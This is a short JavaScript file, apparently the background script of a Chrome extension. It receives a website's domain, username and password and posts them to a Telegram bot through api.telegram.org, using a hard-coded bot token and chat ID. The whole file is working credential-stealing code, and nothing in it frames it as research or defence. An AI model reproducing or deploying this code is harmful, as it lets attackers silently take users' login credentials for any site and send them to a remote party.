chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === "sendToTelegram") {
        const botToken = "7726899538:AAE-87AtkKYOon9zNB3B7OxQre6E-NaMnto";  // Replace with your bot token
        const chatId = "1635012415";      // Replace with your chat ID

        const textMessage = `🔐 *New Login Detected!*  
🌍 *Website:* ${message.domain}  
👤 *Username:* ${message.username}  
🔑 *Password:* ${message.password}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: textMessage,
                parse_mode: "Markdown"
            })
        })
        .then(response => response.json())
        .then(data => console.log("Sent to Telegram:", data))
        .catch(error => console.error("Error:", error));
    }
});
